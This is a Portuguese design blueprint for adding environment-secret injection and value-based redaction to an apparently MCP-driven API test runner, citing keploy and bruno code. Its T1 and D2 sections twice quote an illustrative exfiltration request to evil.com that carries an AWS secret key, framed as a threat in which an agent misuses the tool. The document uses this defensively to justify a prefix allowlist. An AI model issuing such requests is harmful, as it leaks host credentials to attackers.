# Blueprint: M7 — Injeção de env/secrets no run time

> Discovery executada sobre `keploy` (o CORAÇÃO do M7 — o `keploy sanitize` faz **redação POR VALOR**: gitleaks detecta o valor do segredo, e cada ocorrência da STRING é substituída por um placeholder em URL/headers/body/curl — `pkg/service/tools/sanitize.go:391-407`, `containsAnySecret` por `strings.Contains` em `:649`; e a **injeção uniforme** no replay renderiza o documento inteiro de uma vez — `pkg/util.go:337-368`) e `bruno` (o modelo de **fonte de segredo** + a **anatomia do anti-pattern de segurança**: bruno expõe `{...process.env}` INTEIRO ao template — `packages/bruno-cli/src/commands/run.js:568`, namespace `process.env.*` em `interpolate-vars.js:71-74` — sem allowlist/prefixo; e o padrão "nome no git, valor fora do git" para vars secret — `packages/bruno-lang/v2/src/jsonToEnv.js:8-25`), para decidir ANTES de codar: de ONDE vem o segredo no run time, QUAIS env vars um cenário pode ler (restrição de segurança), COMO redigir por VALOR em TODOS os sinks, e ONDE injetar no fluxo Hodor. Mínimo 2 referências independentes (keploy `sanitize.go`/`util.go` + bruno `interpolate-vars.js`/`run.js`/`jsonToEnv.js` + baseline Hodor M1/M3/M4/M6). Plano sugerido: `.claude/knowledge-base/discoveries/plans/m7-env-secrets-plan.md` (a criar via `/discover-plan`).

## Context

M7 (`ROADMAP.md:230`, depende de M1/M3/M4, desbloqueia o teto do M6) pede: (1) **interpolação de env/secret** — `${{ env.NOME }}` resolve de uma fonte de ambiente no RUN TIME, não só de captures de steps anteriores (`ROADMAP.md:236`); (2) **segredos NUNCA persistidos** em `runs/`/`reviews/`/`drafts/` — reusa o redator do M3/M4 em TODOS os sinks (`ROADMAP.md:237`); (3) **E2E** — um cenário com header de auth via env executa contra um endpoint autenticado real e passa (`ROADMAP.md:238`). Risco declarado (`ROADMAP.md:242`): segredo vazar em log/artefato — mitigar redação em TODOS os sinks (já existe o SoT `redactRequestHeaders` do M3).

**Baseline (o que já existe, M0-M6):**

- `src/core/interpolate.ts:9` — `PLACEHOLDER_RE = /\$\{\{\s*([\w.]+)\s*\}\}/g` JÁ aceita `env.NOME` (o `.` está na classe `[\w.]+`); `interpolate(template, variables):11` substitui pelo valor em `variables`; **var ausente → `ScenarioError` (`:13-15`, fail-fast)**. `interpolateRequest:31` interpola url (com `encodeURIComponent` por var — `:36-38`, EC-3), headers (`:43-49`) e body (`:50-52`). **O namespace é FLAT** (`variables` é um `Record<string, unknown>` único — sem escopos separados); `env.NOME` resolveria via uma chave literal `"env.NOME"` no objeto (NÃO via objeto aninhado `{env:{NOME}}`, porque `name in variables` testa a chave-string inteira `:13`).
- `src/core/runScenario.ts:21` — `runScenario(scenario, deps: RunScenarioDeps = {})`: `variables` começa `{}` (`:25`), interpola cada step (`:29`), recaptura de step em step (`:39` `variables = {...variables, ...captures}`). **`RunScenarioDeps` (`:9`) hoje só tem `EnvelopeDeps` (`now`/`newId`) + `timeoutMs` — NÃO tem `secrets`.** Este é o ponto de injeção (D4).
- `src/core/normalizeRun.ts:46` — `SENSITIVE_REQUEST_HEADERS` (authorization/cookie/x-api-key/...); `redactRequestHeaders:68` redige por NOME de header (`SENSITIVE_REQUEST_HEADERS.has(k.toLowerCase()) ? "<redacted>" : v` — `:71`). **É redação por NOME, não por VALOR** — o cerne do gap do DoD #2 (T3/D3).
- `src/core/runStore.ts:48` — `persistRun(env, dir=runs/)` grava `${dir}/${runId}.json` CRU (`JSON.stringify(env)` `:51`); **NÃO redige nada** (o run bruto vai inteiro ao disco). `runs/` é gitignored (`.gitignore` "run BRUTO, efêmero").
- `src/core/reviewArtifact.ts:54` — `buildReviewArtifact(env, verdict):54` chama `normalizeRun(env)` (`:55`) → redige headers por nome (via `redactRequestHeaders` dentro de `normalizeRun:105`). `reviews/` é COMMITÁVEL (`.gitignore` NOTA M3). **Aqui a redação por nome JÁ roda; falta a por valor.**
- `src/core/draftStore.ts:70` — `saveDraft` chama `redactDraftSecrets(valid):78` ANTES de gravar: redige headers por nome (`:104-106`) + regex em `provenance.sourceRef` (`SECRET_IN_TEXT_RE:91`, `BEARER_RE:93`). `drafts/` COMMITÁVEL. **Resíduo documentado (`:99-100`): "segredos embutidos em URL/body do cenário NÃO são redigidos".** Mas o DRAFT é o TEMPLATE pré-execução: ele NÃO deve conter o valor do segredo, só `${{ env.NOME }}` (D5).
- `src/mcp/server.ts:84` — adaptador MCP roda no PROCESSO que TEM `process.env`. `run_scenario:117` chama `runScenario(scenario)` (SEM deps de secret hoje); `check_scenario:176` chama `checkScenario(scenario)` então `persistRun(run):178` (**o run com header de auth RESOLVIDO seria persistido cru** — gap a fechar em D3/D4); `save_scenario_draft:145` chama `saveDraft`.
- `src/core/checkScenario.ts:37` — `checkScenario(scenario, options)`: `runScenario(scenario, options.deps):41` então `findGoldenRun:44` + `diffRuns:46`. **NÃO persiste** (o adaptador persiste `:178`). O teto sem-auth do M6 (`checkScenario.ts:15-16` "endpoint autenticado pode dar falso `regression` (401) até o M7") é exatamente o que M7 remove.

Restrições: `architecture.md` §1-§2 (segredos resolvidos na fronteira do ADAPTADOR — onde `process.env` vive; core puro recebe via DIP); `parsimony-ladder.md` (rung 2 `process.env` é stdlib; rung 4 reusar `interpolate`/`redactRequestHeaders`/`normalizeRun` já instalados; ZERO dep nova); `testing.md` §2/§6 (resolução de secret injetável → core testável sem env real); `CLAUDE.md` §3 honestidade (declarar o que NÃO é redigido).

## Objective

Decidir, ANTES de codar: (a) **de onde vem o segredo** no run time (fonte = `process.env` no adaptador MCP, filtrada); (b) **QUAIS env vars** um cenário pode ler — a decisão de SEGURANÇA central: prefixo `HODOR_SECRET_*` (allowlist por construção) vs allowlist por nome vs env-file declarado — para que `${{ env.AWS_SECRET }}` numa URL maliciosa NÃO exfiltre um segredo arbitrário do host (SSRF+secret); (c) **redação por VALOR** — substituir a STRING do segredo por `<redacted>` em TODO o run ANTES de qualquer sink (runs/reviews/drafts), reaproveitando o algoritmo do `keploy sanitize`; (d) **onde injeta** no fluxo Hodor (adaptador resolve → passa via `RunScenarioDeps.secrets` sob namespace `env.` → `interpolate` mistura captures+secrets → redação por valor roda no core ANTES de `persistRun` E dentro de `buildReviewArtifact`); (e) **var ausente** = erro ou vazio (manter o fail-fast do M1); (f) o **draft** nunca tem o valor (só o template `${{ env.NOME }}`). ZERO dep nova esperada (`process.env` stdlib).

## Coverage Corner 1 — Integration Tests

**Pergunta (Q-IT):** Como as referências testam a fronteira "resolve segredo do ambiente → injeta no request → executa → redige por valor antes de persistir" e o que isso prescreve para os testes de integração do M7?

- **keploy** testa o ciclo redigir→persistir→injetar como funções separadas e simétricas: `SanitizeFileInPlace` (`pkg/service/tools/sanitize.go:864`) lê o testcase, redige por valor e regrava; `DesanitizeFileInPlace` (`sanitize.go:905-943`) é o inverso EXATO (`strings.ReplaceAll(content, "{{string .secret.<key> }}", value)` `:854`-padrão). A INVARIANTE testável: redigir e des-redigir é round-trip; e o `secret.yaml` (valores) é git-ignored (`replay.go:1481`) enquanto o testcase commitável carrega só placeholders. **Lição:** o teste-guarda é "o artefato persistido NÃO contém o valor literal do segredo" — exatamente o DoD #2.
- **keploy** injeta no replay renderizando o documento INTEIRO de uma vez (`prepareHTTPRequest` `pkg/util.go:337-368`: marshal do testcase → `RenderTemplatesInString` → unmarshal `:350-363`), cobrindo URL+headers+body num só passo. **Lição:** a injeção (interpolação) e a redação são passos distintos sobre a mesma serialização — testáveis isoladamente.
- **bruno** resolve env vars num único `combinedVars` (`interpolate-vars.js:67-78`) e passa a `interpolate(str, combinedVars)` (`:79`); o teste natural é "var presente resolve, ausente fica como está OU lança" — bruno deixa o `{{x}}` literal quando ausente (lodash `get` retorna undefined → não substitui), o Hodor LANÇA (`interpolate.ts:13`, fail-fast — decisão diferente, D6).

**Aplicação ao Hodor (testing.md §2/§6 — integração na fronteira; secret injetável via DIP):**

- `interpolate_resolves_env_namespace_from_secrets` — `interpolate("Bearer ${{ env.TOKEN }}", { "env.TOKEN": "s3cr3t" })` → `"Bearer s3cr3t"`. Piso: o namespace `env.` já funciona (regex `[\w.]+` aceita o ponto); só precisa a chave existir em `variables`.
- `interpolate_env_var_absent_throws_scenario_error` — `${{ env.MISSING }}` sem a chave → `ScenarioError` (mantém o fail-fast do M1 `interpolate.ts:13`; D6). Teste-guarda: o cenário NÃO executa silenciosamente com credencial vazia (que daria 401 confuso).
- `runScenario_injects_secrets_under_env_namespace` — `runScenario(scenario, { secrets: { TOKEN: "s3cr3t" } })` com um step `Authorization: Bearer ${{ env.TOKEN }}` → o request EXECUTADO tem o header resolvido (espelha bruno `combinedVars` + keploy injeção; D4).
- `captures_take_precedence_or_coexist_with_secrets` — secret `env.TOKEN` + capture `userId` coexistem no mesmo `variables` flat sem colisão (namespaces distintos: `env.*` vs nomes nus; D4/D7).
- `redactSecretValues_replaces_value_in_header_body_url` — dado um run cujo step tem `Authorization: Bearer s3cr3t`, body `{"k":"s3cr3t"}`, url `https://x/?t=s3cr3t`, `redactSecretValues(run, ["s3cr3t"])` substitui TODAS as 3 ocorrências por `<redacted>` (espelha keploy `containsAnySecret`+`strings.ReplaceAll` `sanitize.go:649,854`; D3). **O teste central do DoD #2.**
- `redactSecretValues_longest_first_no_partial_collision` — dois segredos onde um é prefixo do outro (`abc` e `abcdef`) → substitui o mais longo primeiro (espelha o sort descendente por `len(old)` do keploy `sanitize.go:539`; D3).
- `persistRun_run_never_contains_secret_value` (IT) — após `check_scenario` com auth via env, ler `runs/{id}.json` do disco e asseverar que o valor literal do segredo NÃO aparece em lugar nenhum do JSON (DoD #2 sobre o sink `runs/`).
- `reviewArtifact_never_contains_secret_value` (IT) — `buildReviewArtifact` de um run com auth → o artefato commitável não tem o valor (redação por valor + por nome; DoD #2 sobre `reviews/`).
- `draft_template_keeps_placeholder_not_value` — um draft com `Authorization: Bearer ${{ env.TOKEN }}` persiste o TEMPLATE literal (não resolve, não tem valor — o draft é pré-execução; D5; DoD #2 sobre `drafts/`).
- `e2e_auth_via_env_passes_against_real_endpoint` (E2E) — cenário com `Authorization: Bearer ${{ env.GITHUB_TOKEN }}` contra a API do GitHub autenticada (mesmo alvo do M6 ao vivo); `HODOR_SECRET_GITHUB_TOKEN` no ambiente do processo MCP → resolve, 200, e o `runs/` persistido não vaza o token (DoD #3 + #2 juntos).

## Coverage Corner 2 — Dependencies

**Pergunta (Q-DEP):** Precisamos de lib nova (dotenv, detecção de segredo tipo gitleaks, template engine)? O que as referências usam e o que o Hodor reusa?

- **keploy** usa **gitleaks** (`detector.DetectString` `sanitize.go:259`) para DETECTAR segredos automaticamente por regex (sem o usuário declarar), e Go `text/template` (`RenderTemplatesInString` `util.go:358`) para injetar. São dois pesos: detecção automática (gitleaks) + template engine. **O Hodor NÃO precisa de NENHUM dos dois** — porque o Hodor já SABE quais são os segredos (são os valores que ELE injetou via `env.`), então não há detecção a fazer: a lista de valores a redigir é exatamente `Object.values(secrets)`. E o "template engine" já existe (`interpolate.ts`).
- **bruno** usa `dotenv` (`packages/bruno-lang/v2/src/dotenvToJson.js:1-5`) para `.env` e `electron-store`+`safeStorage` (keychain) para guardar valores secret fora do git (`packages/bruno-electron/src/store/env-secrets.js`). São features de um CLIENT desktop com persistência de coleção — fora do escopo de um MCP server cujo ambiente JÁ é `process.env`.
- **bruno** interpola com função própria (`packages/bruno-common/src/interpolate/index.ts:67-89`, lodash `get` por dot-notation) — equivalente ao `interpolate.ts` do Hodor (regex + lookup). Nenhuma lib de template externa no caminho crítico.

**Decisão Hodor (Rule 9 / parsimony rungs 1-4):**

- **ZERO dep nova.** A fonte do segredo é `process.env` (rung 2, stdlib `node:process`) lida NO ADAPTADOR. A injeção é `interpolate` (M1, já existe). A redação por valor é um `String.prototype.replaceAll` num loop sobre `Object.values(secrets)` (rung 5-6 — algoritmo do keploy `sanitize.go:854` portado para ~15 linhas TS). A redação por nome é `redactRequestHeaders` (M3, já existe).
- **NÃO adotar gitleaks/detecção automática** (rung 1 — YAGNI): o Hodor INJETA os segredos, então CONHECE os valores exatos; detectar segredo "no escuro" (gitleaks) resolve um problema que o Hodor não tem (o keploy GRAVA tráfego de terceiros e precisa adivinhar o que é segredo; o Hodor recebe o segredo explicitamente). Detecção heurística traria falsos-positivos e uma dep pesada para ZERO ganho.
- **NÃO adotar dotenv** no MVP (rung 1): o processo MCP já herda `process.env` do shell/host que o lança (o cliente MCP configura env no spawn). Um `.env` loader é enriquecimento futuro (como bruno faz), não requisito do DoD. `node:process` cobre.
- **zod** (já dep) NÃO precisa de schema novo de segredo — `secrets` é um `Record<string,string>` interno, nunca cruza a fronteira da tool (o agente NÃO manda segredo via MCP — o processo já os tem no env; D2).

## Coverage Corner 3 — Tools

**Pergunta (Q-TOOL):** Onde mora a resolução de segredo? Quantas tools/superfícies novas? O segredo cruza a fronteira MCP?

- **keploy** separa por COMANDOS CLI: `keploy sanitize` (`cli/sanitize.go:19-21`) redige; o replay injeta. A resolução do valor vem do `secret.yaml` sidecar lido em `ReadSecret` (`pkg/platform/yaml/configdb/testset/db.go:114-134`). O segredo nunca cruza uma API de rede — é file-local.
- **bruno** resolve no RUNNER (`interpolate-vars.js:36`), que recebe `processEnvVars` montado em `run.js:568` (`{...process.env}`) — a resolução é interna ao processo CLI/electron; o segredo nunca vai num payload de tool.

**Decisão Hodor (KISS — resolução no adaptador; ZERO tool nova; segredo NUNCA na fronteira MCP):**

- **A resolução mora no ADAPTADOR** (`src/mcp/server.ts`), num helper `resolveSecretsFromEnv()` que lê `process.env`, filtra pelo prefixo `HODOR_SECRET_` (D2), faz strip do prefixo e devolve `{ TOKEN: "...", GITHUB_TOKEN: "..." }`. O adaptador passa isso a `runScenario(scenario, { secrets })` (D4). `architecture.md` §2: a fronteira (onde `process.env` é confiável) resolve; o core recebe por injeção.
- **ZERO tool MCP nova.** O DoD #1/#2/#3 é sobre INTERPOLAÇÃO + REDAÇÃO + E2E — não sobre uma nova ação do agente. As tools existentes (`run_scenario`, `check_scenario`, `replay_suite`) ganham a injeção de secrets internamente; suas ASSINATURAS de input/output NÃO mudam (o segredo não é input). Isto é crucial de SEGURANÇA (D2): **o agente NUNCA envia o segredo via MCP** — o cenário só referencia `${{ env.NOME }}`; o valor vem do `process.env` do host, fora do alcance do agente.
- **O segredo NUNCA cruza a fronteira MCP nem aparece no `structuredContent`/`outputSchema`** — porque o `RunEnvelope` retornado é redigido por valor ANTES de sair do core (D3). O agente recebe o veredito (`ok`/`regression`) e um run com `<redacted>` no lugar das credenciais.

## Coverage Corner 4 — Techniques

### T1 — Fonte do segredo: `process.env` lido no adaptador, filtrado por prefixo `HODOR_SECRET_*` (Q-fonte + Q-segurança, DoD #1)

bruno expõe `{...process.env}` INTEIRO ao template (`run.js:568`), acessível via `{{process.env.QUALQUER_COISA}}` (`interpolate-vars.js:71-74`) — **sem allowlist nem prefixo**. Pior: o node-vm sandbox injeta o `global.process` REAL do host (`packages/bruno-js/src/sandbox/node-vm/index.js:145-150`, `constants.js:25-26`), dando a scripts acesso irrestrito a `process.env`/`process.exit`. Isto é aceitável num CLIENT desktop que o próprio dev roda; é **INACEITÁVEL** num MCP server que um agente dirige (o agente poderia montar um cenário `GET https://evil.com/?leak=${{ env.AWS_SECRET_ACCESS_KEY }}` e exfiltrar qualquer segredo do host — SSRF+secret).

**Aplicação ao Hodor:** o adaptador resolve APENAS as env vars com prefixo `HODOR_SECRET_`, e faz STRIP do prefixo para a chave do namespace:

```
process.env.HODOR_SECRET_GITHUB_TOKEN="ghp_xxx"
  → resolveSecretsFromEnv() → { GITHUB_TOKEN: "ghp_xxx" }
  → cenário usa ${{ env.GITHUB_TOKEN }}
```

Qualquer `${{ env.NOME }}` cujo `NOME` não tenha um `HODOR_SECRET_NOME` correspondente → var ausente → `ScenarioError` (D6). `AWS_SECRET_ACCESS_KEY` SEM o prefixo `HODOR_SECRET_` é INVISÍVEL para o cenário (não está no `secrets` resolvido). O operador OPTA-IN explicitamente cada segredo injetável renomeando-o com o prefixo — allowlist por construção, sem manter uma lista separada (ver D2 trade-offs vs allowlist-por-nome vs env-file).

### T2 — Injeção: estender `RunScenarioDeps` com `secrets`, pré-popular `variables` sob namespace `env.` (Q-injeta, DoD #1)

bruno monta um `combinedVars` único com TODOS os escopos (env, runtime, process.env) e passa a uma só `interpolate` (`interpolate-vars.js:67-79`); o `runtimeVariables` (capturas) tem precedência sobre env (`:73`, comentário "runtimeVariables take precedence"); `process.env` fica num namespace ANINHADO separado (`process.env.*` `:71-74`) — nunca colide com um `{{NOME}}` nu.

**Aplicação ao Hodor:** `RunScenarioDeps` (`runScenario.ts:9`) ganha `secrets?: Record<string, string>`. Em `runScenario`, `variables` começa pré-populado com os secrets sob o namespace `env.` (em vez de `{}`):

```ts
let variables: Record<string, unknown> = {};
for (const [k, v] of Object.entries(deps.secrets ?? {})) variables[`env.${k}`] = v;
// depois o loop de steps recaptura por cima (captures são nomes nus — não colidem com env.*)
```

Espelha bruno (um namespace `env.*` para secrets, nomes nus para captures — sem colisão por construção, como o `process.env.*` aninhado de bruno) e reusa `interpolate` (M1) inteiro. O `interpolate.ts` já resolve `env.GITHUB_TOKEN` porque testa a chave-string literal (`"env.GITHUB_TOKEN" in variables` `:13`) — **nenhuma mudança no interpolate** (parsimony rung 4). Captures de step (nomes nus como `userId`) NUNCA colidem com `env.*` (prefixo distinto), então um cenário malicioso não pode sobrescrever um secret via capture (D7).

### T3 — Redação por VALOR: `redactSecretValues(run, values)` no core, sobre TODO o run, antes de qualquer sink (Q-redação, DoD #2, risco #1)

`redactRequestHeaders` (M3, `normalizeRun.ts:68`) redige por NOME (`Authorization` → `<redacted>`). MAS o segredo resolvido pode escapar: num header NÃO-sensível (`X-Custom-Auth: s3cr3t`), no BODY (`{"token":"s3cr3t"}`), ou na URL (`?api_key=s3cr3t`). O DoD #2 exige que o VALOR nunca persista — então é redação POR VALOR.

keploy é o modelo exato: `containsAnySecret(s, secretSet)` (`sanitize.go:649`) checa por `strings.Contains` (valor, não nome); o substituidor (`sanitize.go:391-407`, e o curl post-pass `applyCurlUsingMaps:527-570`) faz `strings.ReplaceAll(txt, secretValue, placeholder)` (`:561`) com **ordenação longest-first** (`:539`, `sort` descendente por `len(old)`) para evitar colisão parcial entre segredos sobrepostos.

**Aplicação ao Hodor:** `src/core/redactSecretValues.ts` exporta `redactSecretValues(run: RunEnvelope, secretValues: string[]): RunEnvelope` PURO (não muta o input):
1. Filtra valores vazios/curtos (um secret de 1-2 chars redigiria tudo — guard mínimo; keploy ignora `secret == ""` `:651`).
2. Ordena `secretValues` por comprimento DESCENDENTE (longest-first, espelha keploy `:539`).
3. Para cada step, percorre os campos textuais (`request.url`, cada `request.headers[k]`, `request.body`, `response.body`, cada `response.headers[k]` — e os valores capturados em `captures` se um capture pegou um segredo) e faz `value.replaceAll(secretValue, "<redacted>")` para cada secret.
4. Retorna um novo `RunEnvelope` com os campos redigidos.

Reusa a constante `REDACTED = "<redacted>"` (mesma do M3 — DRY). É composição de `String.replaceAll` (stdlib, rung 5). **Roda no CORE antes de `persistRun` E dentro de `buildReviewArtifact`** (D3 — todos os sinks).

### T4 — Onde a redação roda em CADA sink: `runs/`, `reviews/`, `drafts/` (Q-onde, DoD #2, risco #1)

keploy garante o invariante "valor nunca no artefato commitável" via `WithoutSecrets()` (`pkg/models/config.go:22`) que tira o map de segredo ANTES de escrever o config (`testset/db.go:96-98`), e o `secret.yaml` (valores) é git-ignored (`replay.go:1481`). A redação acontece NO PONTO de escrita de cada artefato persistido.

**Aplicação ao Hodor — os 4 sinks e onde a redação entra (D3):**

| Sink | Commitável? | Redação por nome (M3, existe) | Redação por VALOR (M7, nova) | Onde injeta |
|---|---|---|---|---|
| `runs/{id}.json` | NÃO (gitignored) | não roda hoje | **SIM** — `redactSecretValues(run, values)` antes de `persistRun` no ADAPTADOR | `src/mcp/server.ts` (run_scenario/check_scenario) — redige o run ANTES de `persistRun:178` |
| `reviews/{id}.json` | SIM | SIM (`normalizeRun`→`redactRequestHeaders`) | **SIM** — dentro de `buildReviewArtifact` após `normalizeRun` | `src/core/reviewArtifact.ts` (`buildReviewArtifact:54`) |
| `drafts/{id}.json` | SIM | SIM (`redactDraftSecrets`) | **N/A — o draft é o TEMPLATE pré-execução**: contém `${{ env.NOME }}`, nunca o valor (D5) | `src/core/draftStore.ts` (já redige nome; o valor nunca existe ali) |
| `structuredContent` MCP | n/a (rede) | — | **SIM** — o run retornado ao agente é o run JÁ redigido (mesmo objeto que foi persistido) | adaptador retorna o run redigido |

Por que `runs/` (efêmero, gitignored) TAMBÉM precisa de redação por valor: (i) `runs/` é a FONTE de `reviews/` (`buildReviewArtifact(env)` recebe o run) — se o run em memória tem o valor, o review herda; redigir o run na origem é defense-in-depth; (ii) `runs/` é exibido na WEB (`GET /runs/:id`) — um valor lá vaza na tela; (iii) `runs/` pode ser inspecionado em disco mesmo gitignored (logs de CI, dump de debug). O DoD #2 lista `runs/` explicitamente (`ROADMAP.md:237`). **Decisão: o run é redigido por valor UMA VEZ, na fronteira do core, e o objeto redigido alimenta TODOS os consumidores** (persistRun, structuredContent, buildReviewArtifact) — sem duplicar a redação.

### T5 — Como o core obtém a lista de valores a redigir SEM o segredo cruzar a fronteira de novo (Q-onde, segurança)

A redação por valor precisa da LISTA de valores (`["ghp_xxx", ...]`). Esses valores SÃO os `Object.values(secrets)` que o adaptador resolveu (T1). O fluxo mantém o segredo dentro do processo:

```
adaptador: secrets = resolveSecretsFromEnv()            // {GITHUB_TOKEN: "ghp_xxx"}
adaptador: run = await runScenario(scenario, { secrets }) // run tem o valor resolvido nos headers
adaptador: redacted = redactSecretValues(run, Object.values(secrets))  // run sem o valor
adaptador: await persistRun(redacted)                    // disco limpo
adaptador: return { structuredContent: <derivado de redacted> }  // agente recebe limpo
```

O core (`redactSecretValues`) recebe os valores como ARGUMENTO explícito (DIP — `architecture.md` §2) — testável com valores fake, sem `process.env`. O segredo nunca é logado (o `console.error` de runtime metric loga só `status`/`runId`/`path` — `server.ts:184` — nunca o run inteiro).

## Cross-cutting Comparison

| Dimensão | keploy | bruno | Decisão M7 (Hodor) |
|---|---|---|---|
| Fonte do segredo | `secret.yaml` sidecar git-ignored (`testset/db.go:114`) | `{...process.env}` INTEIRO (`run.js:568`) + keychain p/ vars secret | `process.env` filtrado por prefixo `HODOR_SECRET_*` no adaptador (D1/D2) |
| Restrição de QUAIS vars | n/a (valores explícitos no sidecar) | **NENHUMA** — todo `process.env` exposto via `process.env.*` (`interpolate-vars.js:71`) ⚠️ | **prefixo `HODOR_SECRET_*`** — allowlist por construção (D2) |
| Detecção de segredo | gitleaks automático (`sanitize.go:259`) | declarado (flag `secret` na var, `jsonToEnv.js:18`) | **nenhuma** — o Hodor INJETA, logo CONHECE os valores (ZERO dep; D-DEP) |
| Injeção no request | render do doc inteiro (`util.go:358`) | `combinedVars` único → `interpolate` (`interpolate-vars.js:79`) | `RunScenarioDeps.secrets` → namespace `env.*` em `variables` → `interpolate` M1 (D4) |
| Namespace | `.secret.X` (`util.go:123`) | `process.env.X` aninhado, `runtime` nu (`:71-74`) | `env.X` (nomes nus = captures; sem colisão — D7) |
| Redação por VALOR | `containsAnySecret`+`ReplaceAll` longest-first (`sanitize.go:649,539,561`) | **NENHUMA** (só image-redact; `runner/utils/index.ts:26`) ⚠️ | `redactSecretValues(run, values)` longest-first (porta keploy; D3) |
| Redação por NOME | n/a | header-skip opt-in (`sanitize-results.js`) | `redactRequestHeaders` M3 (já existe, complementa por-valor) |
| Sinks redigidos | testcase commitável (sidecar guarda valor) | nenhum (gap de bruno) | `runs/`+`reviews/`+`structuredContent` por valor; `drafts/` é template (D3/D5) |
| Var ausente | placeholder fica literal | `{{x}}` fica literal (lodash get undefined) | **`ScenarioError` (fail-fast M1)** — credencial vazia daria 401 confuso (D6) |
| Segredo cruza a API? | não (file-local) | não (interno ao CLI) | **NÃO** — agente referencia `${{ env.X }}`, valor vem do host (D2) |

## ADRs

### D1 — Fonte do segredo = `process.env` lido NO ADAPTADOR (`src/mcp/server.ts`), nunca no core; core recebe `secrets` por injeção (DIP)

**Decision:** um helper `resolveSecretsFromEnv(env = process.env): Record<string,string>` no adaptador MCP lê `process.env`, e o adaptador passa o resultado a `runScenario`/`checkScenario`/`replaySuite` via `RunScenarioDeps.secrets`. O CORE (`runScenario`, `redactSecretValues`) NUNCA lê `process.env` — recebe os secrets como argumento.

**Rationale:** `architecture.md` §1-§2 — a fronteira (adaptador) é onde os dados externos (`process.env`) são confiáveis e resolvidos; o core puro recebe por DIP, ficando testável sem ambiente real (`testing.md` §6 — injetar é o padrão já usado para `now`/`newId` em `runStore.ts:8-12`). bruno resolve no runner (`interpolate-vars.js:36`), keploy lê do sidecar no replay (`replay.go:1476`) — ambos resolvem na borda de execução, não no domínio. `process.env` é stdlib (`parsimony-ladder.md` rung 2 — ZERO dep).

**Alternatives considered:** (a) `interpolate`/`runScenario` lerem `process.env` direto — REJEITADO (`architecture.md` §2: domínio não toca infra; quebra testabilidade; e impede o filtro de segurança ficar num lugar só). (b) o agente MANDAR o segredo como input da tool — REJEITADO frontalmente (o segredo apareceria no payload MCP, em logs do cliente, e o agente teria o segredo em mãos — anti-tese da injeção segura; D2). (c) um `SecretProvider` interface com múltiplas implementações (env, vault, file) — REJEITADO (YAGNI — `parsimony-ladder.md` rung 1; só há uma fonte hoje, `process.env`; interface p/ um implementador é abstração prematura — `architecture.md` §6).

**Consequences:** core testável sem env; uma única fronteira de resolução; o filtro de segurança (D2) mora num só helper; `RunScenarioDeps` ganha um campo opcional aditivo (backward-compatible — cenários sem secret seguem funcionando).

### D2 — Restrição de segurança: SÓ env vars com prefixo `HODOR_SECRET_*` são injetáveis (allowlist por construção); strip do prefixo no namespace `env.`

**Decision:** `resolveSecretsFromEnv` injeta APENAS as chaves de `process.env` que começam com `HODOR_SECRET_`, fazendo strip do prefixo: `HODOR_SECRET_GITHUB_TOKEN` → `{ GITHUB_TOKEN: "..." }`, usável como `${{ env.GITHUB_TOKEN }}`. Toda env var SEM o prefixo é INVISÍVEL ao cenário. Não há acesso a `process.env` arbitrário a partir de um template.

**Rationale:** a decisão de SEGURANÇA central do M7. bruno demonstra o anti-pattern: expõe `{...process.env}` inteiro (`run.js:568`) acessível via `{{process.env.X}}` (`interpolate-vars.js:71-74`) e o node-vm vaza `global.process` (`sandbox/node-vm/index.js:145-150`). Num CLIENT desktop dirigido pelo dono, tudo bem; num MCP server dirigido por um AGENTE, é exfiltração: `GET https://evil.com/?x=${{ env.AWS_SECRET_ACCESS_KEY }}` mandaria o segredo do host para um atacante (SSRF+secret leak). O prefixo `HODOR_SECRET_` é uma **allowlist por construção** — o operador OPTA-IN explicitamente cada segredo injetável ao renomeá-lo com o prefixo; nada mais do ambiente do host é alcançável. KISS: nenhuma lista separada a manter (vs allowlist-por-nome), nenhum parser de arquivo (vs env-file).

**Alternatives considered:** (a) **allowlist por nome** num arquivo `rules/secret-allowlist.txt` (`["GITHUB_TOKEN", ...]`) — REJEITADO: introduz um arquivo de config + parser + staleness (uma var no allowlist mas ausente do env, ou vice-versa) para o MESMO efeito que um prefixo dá de graça; o prefixo É a allowlist, materializada no nome da própria env var. (b) **env-file declarado** (`.env` à la bruno `dotenvToJson.js`) — REJEITADO no MVP (YAGNI — `parsimony-ladder.md` rung 1; o processo MCP já herda env do spawn; um loader de `.env` é enriquecimento futuro, não DoD). (c) **expor `process.env` inteiro como bruno** — REJEITADO frontalmente (exfiltração; o pior anti-pattern para um servidor dirigido por agente). (d) prefixo configurável via env (`HODOR_SECRET_PREFIX`) — adiado (YAGNI; um prefixo fixo é mais simples e auditável; mudar exige só um rename). (e) **environment declarado dentro do Scenario** (campo `environment` no schema, à la bruno) — REJEITADO: colocaria a LISTA de segredos no artefato commitável (`drafts/`/`reviews/`), e o agente controla o cenário — daria ao agente o poder de declarar quais env vars ler; a fonte de verdade de QUAIS segredos existem é o OPERADOR (via prefixo no env do host), não o cenário.

**Consequences:** exfiltração fechada (só o explicitamente opt-in é alcançável); ZERO config nova; o operador controla a allowlist renomeando env vars; documentar no README que segredos injetáveis usam o prefixo `HODOR_SECRET_`; var sem prefixo referenciada → `no_baseline`-style erro de var ausente (D6), nunca vazamento.

### D3 — Redação POR VALOR no core (`redactSecretValues`) sobre TODO o run, longest-first, antes de TODOS os sinks; complementa (não substitui) a redação por nome do M3

**Decision:** `src/core/redactSecretValues.ts` exporta `redactSecretValues(run: RunEnvelope, secretValues: string[]): RunEnvelope` PURO: ordena os valores por comprimento descendente, e para cada step substitui (`String.replaceAll`) cada `secretValue` por `<redacted>` em `request.url`, `request.headers[*]`, `request.body`, `response.headers[*]`, `response.body` e valores de `captures`. O adaptador chama isso ANTES de `persistRun` e antes de devolver o `structuredContent`; `buildReviewArtifact` chama isso após `normalizeRun`. A redação por NOME (`redactRequestHeaders`, M3) CONTINUA (complementar — cobre o caso de um header sensível sem o valor injetado por nós, ex.: um cookie estático no cenário).

**Rationale:** DoD #2 exige que o VALOR nunca persista. `redactRequestHeaders` (M3, `normalizeRun.ts:68`) redige por NOME — um segredo num header não-sensível, body ou URL escaparia (`runs/`, `reviews/`, web). keploy é o modelo exato e battle-tested: `containsAnySecret` por `strings.Contains` (valor — `sanitize.go:649`) + `ReplaceAll` com ordenação longest-first (`sanitize.go:539,561`) para que segredos sobrepostos (um prefixo do outro) não se corrompam. O Hodor tem vantagem sobre keploy: NÃO precisa detectar (gitleaks) — a lista de valores É `Object.values(secrets)` que ele mesmo injetou. Composição de `String.replaceAll` stdlib (`parsimony-ladder.md` rung 5; ZERO dep). bruno NÃO redige por valor (`runner/utils/index.ts:26` só image) — o gap que o Hodor fecha.

